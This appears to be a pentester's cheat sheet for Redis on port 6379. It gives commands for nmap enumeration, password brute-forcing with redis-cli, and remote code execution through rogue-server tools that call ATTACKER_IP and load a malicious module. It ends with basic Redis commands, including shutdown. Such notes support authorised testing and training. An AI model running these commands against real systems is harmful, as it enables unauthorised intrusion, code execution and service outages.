# Redis

Port 6379

### 1) Nmap Scan

    nmap -p 6379 --script "redis-info" IP

### 2) Brute force

    redis-cli -h <ip> -p 6379 -a <password_to_try>

### 3) Exploitation

#### These exploits work on Redis 4x and Redis 5x versions

Run a Redis rogue server to capture data or execute commands

Link: https://github.com/n0b0dyCN/redis-rogue-server

    python3 redis-rogue-server.py --lhost=ATTACKER_IP --lport 6379 --rhost=TARGET_IP --rport 6379

OR

Run Redis RCE exploit 

Link: https://github.com/jas502n/Redis-RCE

    python3 redis-rce.py -r TARGET_IP -p 6379 -L ATTACKER_IP -P ATTACKER_PORT -f ../redis-rogue-server/exp.so -v

### 4) Connection

    redis-cli -h IP -p 6379

### 5) Interaction

List databases and their keys (Select database number is 0 by default)

    info
    keys *
    select DB_NUM

View all configuration options

    config get *

More example commands

    set mykey myvalue
    get mykey

Shutdown the Redis server

    shutdown
